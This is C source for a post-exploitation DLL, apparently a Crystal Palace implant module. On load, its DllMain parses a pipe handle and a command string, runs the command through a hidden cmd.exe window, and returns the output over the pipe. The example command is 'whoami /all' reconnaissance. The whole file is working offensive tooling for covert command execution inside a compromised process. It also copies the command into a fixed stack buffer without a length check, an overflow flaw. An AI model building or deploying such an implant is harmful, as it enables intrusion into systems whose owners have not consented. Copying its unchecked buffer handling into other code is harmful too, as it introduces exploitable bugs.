/*
 * crystalexec.c — Crystal Palace post-ex DLL (CRT-free, kernel32-only)
 *
 * Runs a shell command and sends stdout+stderr to an anonymous pipe handle
 * supplied by the caller in loader_arguments.
 *
 * lpvReserved format:  "<hwrite_hex>|<command>"
 *   e.g.  "0x94|whoami /all"
 *
 * Only imports: kernel32.dll (CreateProcessA, WaitForSingleObject, CloseHandle).
 * No CRT (no msvcrt.dll) — safe for manual DLL loading inside Crystal Palace.
 */

#include <windows.h>

/* ── minimal string helpers (no CRT) ─────────────────────────────────────── */

static UINT_PTR hex_parse(const char *s)
{
    UINT_PTR v = 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    for (; *s && *s != '|'; s++) {
        v <<= 4;
        if      (*s >= '0' && *s <= '9') v |= (UINT_PTR)(*s - '0');
        else if (*s >= 'a' && *s <= 'f') v |= (UINT_PTR)(*s - 'a' + 10);
        else if (*s >= 'A' && *s <= 'F') v |= (UINT_PTR)(*s - 'A' + 10);
    }
    return v;
}

static char *str_append(char *dst, const char *src)
{
    while (*src) *dst++ = *src++;
    return dst;
}

/* ── DllMain ──────────────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hDll;
    if (fdwReason != DLL_PROCESS_ATTACH) return TRUE;

    char *raw = (char *)lpvReserved;
    if (!raw || !*raw) return TRUE;

    /* Find '|' separator between handle and command */
    const char *p = raw;
    while (*p && *p != '|') p++;
    if (!*p || !*(p + 1)) return TRUE;

    HANDLE hWrite = (HANDLE)hex_parse(raw);
    if (!hWrite || hWrite == INVALID_HANDLE_VALUE) return TRUE;

    const char *cmd = p + 1;

    /* Build: "cmd.exe /c <cmd> 2>&1" */
    char full_cmd[8192];
    char *end = str_append(full_cmd, "cmd.exe /c ");
    end = str_append(end, cmd);
    str_append(end, " 2>&1");

    STARTUPINFOA si    = { sizeof(si) };
    si.dwFlags         = STARTF_USESTDHANDLES;
    si.hStdInput       = NULL;    /* no stdin — process has no console */
    si.hStdOutput      = hWrite;
    si.hStdError       = hWrite;

    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(NULL, full_cmd, NULL, NULL,
                        TRUE,             /* bInheritHandles → hWrite goes to child */
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        return TRUE;
    }

    WaitForSingleObject(pi.hProcess, 60000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hWrite);   /* EOF signal: unblocks ReadFile on hRead */
    return TRUE;
}
